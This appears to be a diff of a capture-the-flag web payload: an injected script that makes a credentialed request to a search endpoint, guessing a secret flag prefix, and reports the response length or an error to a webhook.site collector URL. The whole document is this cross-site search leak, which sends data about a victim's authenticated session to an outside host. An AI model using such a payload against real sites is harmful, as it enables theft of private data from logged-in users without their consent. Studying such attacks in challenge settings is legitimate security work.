@@ -1,7 +1,12 @@
 <script>
-fetch("/search?q=flag{a", {credentials:"include"})
+fetch("https://jtxhz6mt-3000.inc1.devtunnels.ms/search?q=flag{a", {
+  credentials: "include"
+})
 .then(r => r.text())
 .then(t => {
- fetch("https://webhook.site/231920c7-3650-47a2-9d3e-e085820e329b?size="+t.length);
+  fetch("https://webhook.site/231920c7-3650-47a2-9d3e-e085820e329b?size=" + t.length);
+})
+.catch(e => {
+  fetch("https://webhook.site/231920c7-3650-47a2-9d3e-e085820e329b?error=1");
 });
 </script>
